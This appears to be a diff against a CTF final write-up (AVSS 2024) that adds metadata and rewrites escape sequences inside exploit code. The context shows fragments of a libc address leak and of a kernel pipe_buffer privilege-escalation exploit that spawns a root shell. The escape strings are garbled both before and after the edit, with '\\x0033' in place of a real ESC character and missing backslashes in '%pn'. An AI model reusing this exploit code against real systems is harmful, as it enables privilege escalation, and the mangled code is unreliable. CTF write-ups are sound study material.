@@ -60,6 +60,9 @@ prerequisites:
 - glibc 2.35 tcache / fastbin 行为
 - Hybrid App JS bridge 调试方法（frida + chrome devtools）
 - pwntools / heap 工具链
+contest_normalized: "AVSS"
+contest_year: 2024
+subcategory_guess: "rce"
 ---
 # AVSS 2024 Final Writeup
 
@@ -805,7 +808,7 @@ xmcve@qq.com
                //__sclose
                libc_base = u32(leak.substr(0x48, 8)) - 0xA8C58;
                system_addr = libc_base + 0x60CC4;
-               heap_addr = u32(leak.substr(0x8, 6) + "  ");
+               heap_addr = u32(leak.substr(0x8, 6) + "\\x00\\x00");
                found = map[j];
                break;
             }
@@ -1983,16 +1986,16 @@ reboot
 
 void err_msg(char *msg)
 {
-    printf(" 33[31m 33[1m[!] %s  33[0mn",msg);
+    printf("\\x0033[31m\\x0033[1m[!] %s \\x0033[0mn",msg);
     exit(0);
 }
 void output_msg(char *msg)
 {
-    printf(" 33[34m 33[1m[+] %s  33[0mn",msg);
+    printf("\\x0033[34m\\x0033[1m[+] %s \\x0033[0mn",msg);
 }
 void print_addr(char *msg, size_t value)
 {
-    printf(" 33[35m 33[1m[*] %s == %p 33[0mn",msg,(size_t *)value);
+    printf("\\x0033[35m\\x0033[1m[*] %s == %p\\x0033[0mn",msg,(size_t *)value);
 }
 void bind_core(int core)
 {
@@ -2008,13 +2011,13 @@ void bind_core(int core)
 void get_root_shell(void)       
 {
     if(getuid()) {
-        puts(" 33[31m 33[1m[x] Failed to get the root! 33[0m");
+        puts("\\x0033[31m\\x0033[1m[x] Failed to get the root!\\x0033[0m");
         sleep(5);
         exit(EXIT_FAILURE);
     }
 
-    puts(" 33[32m 33[1m[+] Successful to get the root.  33[0m");
-    puts(" 33[34m 33[1m[*] Execve root shell now... 33[0m");
+    puts("\\x0033[32m\\x0033[1m[+] Successful to get the root. \\x0033[0m");
+    puts("\\x0033[34m\\x0033[1m[*] Execve root shell now...\\x0033[0m");
     
     system("/bin/sh");
     
@@ -2124,7 +2127,7 @@ int self_2nd_pipe_pid = -1, self_3rd_pipe_pid = -1, self_4th_pipe_pid =�
 struct pipe_buffer info_pipe_buf;
 
 struct pipe_buffer evil_2nd_buf, evil_3rd_buf, evil_4th_buf;
-char temp_zero_buf[0x1000]= { ' ' };
+char temp_zero_buf[0x1000]= { '\\x00' };
 void setup_evil_pipe(void)
 {
     /* init the initial val for 2nd,3rd and 4th pipe, for recovering only */
@@ -2355,8 +2358,8 @@ int main(){
     memcpy(&info_pipe_buf, buffer, sizeof(struct pipe_buffer));
 
     print_binary(&info_pipe_buf, sizeof(struct pipe_buffer));
-    printf(" 33[34m 33[1m[?] info_pipe_buf->page:  33[0m%pn" 
-           " 33[34m 33[1m[?] info_pipe_buf->ops:  33[0m%pn", 
+    printf("\\x0033[34m\\x0033[1m[?] info_pipe_buf->page: \\x0033[0m%pn" 
+           "\\x0033[34m\\x0033[1m[?] info_pipe_buf->ops: \\x0033[0m%pn", 
            info_pipe_buf.page, info_pipe_buf.ops);
 
     if ((size_t) info_pipe_buf.page < 0xffffff0000000000
@@ -2369,14 +2372,14 @@ int main(){
         char bsd_str[0x10];
         int nr;
 
-        memset(bsd_str, ' ', sizeof(bsd_str));
+        memset(bsd_str, '\\x00', sizeof(bsd_str));
         read(pipe_fd[i][0], bsd_str, 8);
         read(pipe_fd[i][0], &nr, sizeof(int));
         if (!strcmp(bsd_str, "bsdhenry") && nr != i) {
             orig_pid = nr;
             victim_pid = i;
-            printf(" 33[32m 33[1m[+] Found victim:  33[0m%d "
-                   " 33[32m 33[1m, orig:  33[0m%dnn", 
+            printf("\\x0033[32m\\x0033[1m[+] Found victim: \\x0033[0m%d "
+                   "\\x0033[32m\\x0033[1m, orig: \\x0033[0m%dnn", 
                    victim_pid, orig_pid);
             break;
         }
@@ -2437,7 +2440,7 @@ int main(){
     printf("======================n");
     // memset(buffer, 'a', 0x200);
     write(pipe_fd[victim_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));
-    memset(buffer, ' ', 0x100);
+    memset(buffer, '\\x00', 0x100);
     read(pipe_fd[victim_pid][0], buffer, 0x100);
     print_binary(buffer, 0x100);
     printf("======================n");
@@ -2454,7 +2457,7 @@ int main(){
         print_binary(&page_ptr, 0x8);
         if (page_ptr == evil_pipe_buf.page) {
             self_2nd_pipe_pid = i;
-            printf(" 33[32m 33[1m[+] Found self-writing pipe:  33[0m%dn", 
+            printf("\\x0033[32m\\x0033[1m[+] Found self-writing pipe: \\x0033[0m%dn", 
                     self_2nd_pipe_pid);
             break;
         }
@@ -2480,7 +2483,7 @@ int main(){
         read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
         if (page_ptr == evil_pipe_buf.page) {
             self_3rd_pipe_pid = i;
-            printf(" 33[32m 33[1m[+] Found another self-writing pipe: 33[0m"
+            printf("\\x0033[32m\\x0033[1m[+] Found another self-writing pipe:\\x0033[0m"
                     "%dn", self_3rd_pipe_pid);
             break;
         }
@@ -2508,7 +2511,7 @@ int main(){
         read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
         if (page_ptr == evil_pipe_buf.page) {
             self_4th_pipe_pid = i;
-            printf(" 33[32m 33[1m[+] Found another self-writing pipe: 33[0m"
+            printf("\\x0033[32m\\x0033[1m[+] Found another self-writing pipe:\\x0033[0m"
                     "%dn", self_4th_pipe_pid);
             break;
         }
@@ -2807,16 +2810,16 @@ size_t race(mystruct *userkey, char *buffer, unsigned long len, char *u
 
 void err_msg(char *msg)
 {
-    printf(" 33[31m 33[1m[!] %s  33[0mn",msg);
+    printf("\\x0033[31m\\x0033[1m[!] %s \\x0033[0mn",msg);
     exit(0);
 }
 void output_msg(char *msg)
 {
-    printf(" 33[34m 33[1m[+] %s  33[0mn",msg);
+    printf("\\x0033[34m\\x0033[1m[+] %s \\x0033[0mn",msg);
 }
 void print_addr(char *msg, size_t value)
 {
-    printf(" 33[35m 33[1m[*] %s == %p 33[0mn",msg,(size_t *)value);
+    printf("\\x0033[35m\\x0033[1m[*] %s == %p\\x0033[0mn",msg,(size_t *)value);
 }
 void bind_core(int core)
 {
